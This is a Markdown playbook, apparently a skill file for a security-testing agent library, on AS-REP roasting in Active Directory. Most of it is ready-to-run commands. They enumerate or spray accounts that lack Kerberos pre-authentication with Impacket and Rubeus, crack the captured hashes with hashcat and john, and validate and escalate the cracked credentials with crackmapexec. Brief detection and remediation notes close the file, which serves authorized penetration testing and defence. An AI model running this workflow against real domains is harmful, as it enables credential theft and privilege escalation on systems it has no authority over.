<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: performing-as-rep-roasting
description: >-
  Identify and exploit Active Directory accounts without Kerberos pre-authentication
  required, extracting AS-REP hashes for offline cracking using Impacket GetNPUsers,
  Rubeus, and hashcat.
domain: cybersecurity
subdomain: active-directory-security
tags:
  - as-rep-roasting
  - kerberos
  - pre-authentication
  - credential-access
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1558.004"]
  frameworks: ["MITRE ATT&CK"]
  tools: ["impacket", "rubeus", "hashcat"]
---

# Performing AS-REP Roasting

## Overview

AS-REP roasting targets accounts where Kerberos pre-authentication is disabled
(DONT_REQUIRE_PREAUTH UAC flag). An attacker can request an AS-REP for these
accounts without knowing their password, then crack the encrypted portion offline.
Unlike Kerberoasting, this can be performed without any domain credentials if
usernames are known.

## Prerequisites

- Tools: `impacket`, `hashcat` or `john`
- Username list or valid domain credentials for LDAP enumeration
- Network access to domain controller (Kerberos 88/TCP)

## Workflow

### Step 1: Identify Vulnerable Accounts

```bash
# With valid credentials — enumerate DONT_REQUIRE_PREAUTH via LDAP
impacket-GetNPUsers corp.local/jsmith:'P@ssw0rd' -dc-ip 10.0.0.1 \
  -request -format hashcat -outputfile asrep.txt

# Without credentials — spray username list
impacket-GetNPUsers corp.local/ -dc-ip 10.0.0.1 \
  -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass

# Rubeus from Windows
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

### Step 2: Crack AS-REP Hashes

```bash
# Hashcat mode 18200 for AS-REP (Kerberos 5 AS-REP etype 23)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# John the Ripper
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

### Step 3: Validate and Escalate

```bash
# Validate cracked credentials
crackmapexec smb 10.0.0.1 -u victim_user -p 'CrackedPass' -d corp.local

# Check group memberships and privileges
crackmapexec ldap 10.0.0.1 -u victim_user -p 'CrackedPass' \
  -d corp.local --admin-count

# Analyze results
python3 scripts/agent.py analyze --domain corp.local --dc-ip 10.0.0.1
```

## Verification

- [ ] Accounts with DONT_REQUIRE_PREAUTH flag enumerated
- [ ] AS-REP hashes extracted in hashcat format
- [ ] Hashes cracked or confirmed to use strong passwords
- [ ] Vulnerable accounts mapped to privilege levels
- [ ] Remediation: re-enable pre-authentication where possible

## Detection Opportunities

- Event 4768 with pre-authentication type 0 (no preauth)
- Event 4768 with encryption type 0x17 (RC4 downgrade)
- Spike in AS-REQ requests targeting multiple accounts
- Sigma rule: `win_security_asrep_roasting`

## References

- [Impacket GetNPUsers](https://github.com/fortra/impacket/blob/main/examples/GetNPUsers.py)
- [Harmj0y — Roasting AS-REPs](https://harmj0y.net/blog/activedirectory/roasting-as-reps/)
